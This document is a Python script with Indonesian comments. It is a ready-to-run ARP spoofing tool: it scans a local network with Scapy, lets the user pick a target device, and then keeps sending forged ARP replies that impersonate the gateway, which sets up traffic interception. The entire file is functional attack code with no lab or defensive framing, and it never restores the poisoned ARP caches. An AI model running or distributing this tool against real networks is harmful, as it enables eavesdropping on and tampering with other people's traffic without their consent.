from scapy.all import ARP, Ether, srp, send
import time

def scan_network(network_range):
    """
    Melakukan ARP scan pada jaringan dan mengembalikan daftar perangkat yang aktif.
    """
    print(f"[+] Scanning jaringan {network_range}...\n")
    
    arp_request = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    
    result = srp(packet, timeout=5, verbose=False)[0]
    
    devices = []
    for sent, received in result:
        devices.append({"ip": received.psrc, "mac": received.hwsrc})

    return devices

def display_devices(devices):
    """
    Menampilkan daftar perangkat yang ditemukan dalam jaringan.
    """
    print("\nDaftar Perangkat yang Terdeteksi:")
    print("="*50)
    print("No.\tIP Address\t\tMAC Address")
    print("="*50)
    for index, device in enumerate(devices):
        print(f"{index+1}.\t{device['ip']}\t{device['mac']}")
    print("="*50, "\n")

def get_mac(ip):
    """
    Mendapatkan MAC address dari IP target.
    """
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    
    result = srp(packet, timeout=5, verbose=False)[0]
    
    if result:
        return result[0][1].hwsrc
    return None

def arp_spoof(target_ip, spoof_ip):
    """
    Mengirimkan paket ARP Spoofing untuk mengelabui target.
    """
    target_mac = get_mac(target_ip)
    
    if not target_mac:
        print("[!] Gagal mendapatkan MAC address target.")
        return
    
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    print(f"[+] Memulai ARP Spoofing ke {target_ip} ({target_mac})...")
    try:
        while True:
            send(packet, verbose=False)
            print(f"[+] Mengirim ARP Spoof ke {target_ip}, berpura-pura sebagai {spoof_ip}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Serangan dihentikan.")

# --- Main Program ---
print("="*50)
print("     ARP Spoofer - Manual IP Input")
print("="*50)

# **1. Memasukkan IP Gateway**
gateway_ip = input("Masukkan IP Gateway: ").strip()

# **2. Memilih metode scanning**
print("\n[1] Scan Jaringan Otomatis")
print("[2] Masukkan IP Target Manual")
mode = input("Pilih metode (1/2): ").strip()

if mode == "1":
    # **User Memasukkan Range IP Jaringan untuk Scan**
    network_range = input("Masukkan range IP (contoh: 192.168.1.0/24): ").strip()
    if not "/" in network_range:
        network_range += "/24"  # Tambahkan subnet default jika tidak ada
    
    # **Scanning Jaringan**
    devices = scan_network(network_range)
    
    if not devices:
        print("[!] Tidak ada perangkat ditemukan.")
    else:
        display_devices(devices)

        # **Memilih target dari daftar hasil scan**
        try:
            target_index = int(input("Pilih nomor target: ")) - 1
            if target_index < 0 or target_index >= len(devices):
                print("[!] Nomor tidak valid.")
            else:
                target_ip = devices[target_index]["ip"]
                print(f"[+] Target: {target_ip}")
                print(f"[+] Gateway: {gateway_ip}")

                # **Menjalankan ARP Spoofing**
                arp_spoof(target_ip, gateway_ip)

        except ValueError:
            print("[!] Input harus berupa angka.")

elif mode == "2":
    # **User Memasukkan IP Target Secara Manual**
    target_ip = input("Masukkan IP Target: ").strip()
    
    # **Menjalankan ARP Spoofing**
    arp_spoof(target_ip, gateway_ip)

else:
    print("[!] Pilihan tidak valid.")
